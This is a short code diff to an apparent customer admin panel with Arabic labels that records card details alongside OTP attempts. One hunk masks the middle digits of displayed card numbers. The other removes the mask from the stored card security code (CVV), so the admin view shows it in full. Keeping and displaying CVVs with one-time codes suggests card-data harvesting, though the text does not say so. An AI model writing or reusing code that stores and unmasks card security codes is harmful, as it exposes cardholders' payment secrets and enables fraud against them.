@@ -26,7 +26,13 @@ interface OtpAttempt {
 
 function formatCardNumber(num: string | undefined | null) {
   if (!num) return '---';
-  return num.replace(/(.{4})/g, '$1 ').trim();
+  // Remove spaces and mask middle digits (show first 6 and last 4)
+  const cleanNum = num.replace(/\s/g, '');
+  if (cleanNum.length <= 10) return cleanNum;
+  const first6 = cleanNum.slice(0, 6);
+  const last4 = cleanNum.slice(-4);
+  const masked = '*'.repeat(cleanNum.length - 10);
+  return `${first6} ${masked} ${last4}`;
 }
 
 function getPaymentMethodLabel(method: string | undefined) {
@@ -441,7 +447,7 @@ export function CustomersAdmin() {
 
         <div className="flex items-center justify-between">
           <p className="text-sm text-muted-foreground">رمز الأمان (CVV)</p>
-          <span className="font-medium" dir="ltr">{attempt.cardCvv ? '***' : '---'}</span>
+          <span className="font-medium" dir="ltr">{attempt.cardCvv || '---'}</span>
         </div>
       </div>
     </div>
